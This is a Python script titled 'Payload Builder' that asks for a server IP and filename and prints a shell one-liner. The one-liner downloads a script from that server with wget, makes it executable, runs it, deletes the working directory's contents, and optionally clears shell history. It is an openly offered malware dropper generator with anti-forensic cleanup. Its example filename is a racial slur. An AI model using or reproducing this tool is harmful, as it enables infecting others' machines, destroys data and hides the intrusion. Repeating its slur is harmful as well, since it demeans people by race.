import os, platform, sys
from colorama import Fore, init


## ------------ ##
## Made by 0x00 ##
## Please keep  ##
## the credits! ##
## ------------ ##

while True:
	try:
		if platform.platform().startswith('Windows'):
			os.system('cls')
			os.system('title \" Payload Builder | By 0x00 \"')
		else:
			os.system('clear')

		server = input(f'{Fore.RESET}Enter your servers IP (example, 1.3.3.7)\n>{Fore.RED} ')
		file = input(f'{Fore.RESET}Enter your filename (example, nigger.sh)\n>{Fore.RED} ')
		choice = input(f'{Fore.RESET}Would you like to delete the history when the command is ran? (Y/N)\n>{Fore.RED} ')
		eh = f'{Fore.RESET}{Fore.YELLOW}\ncd /tmp || cd /run || cd / || cd /var/run || cd /var || cd /root || cd /mnt; wget http://{server}/{file}; chmod 777 {file}; sh {file}; rm -rf *'
		if choice.upper() == "Y":
			eh += '; history -c'
		else:
			pass

		print(f'{Fore.RESET}Your payload: {eh}{Fore.RESET}')
		sys.exit()
	except KeyboardInterrupt:
		break
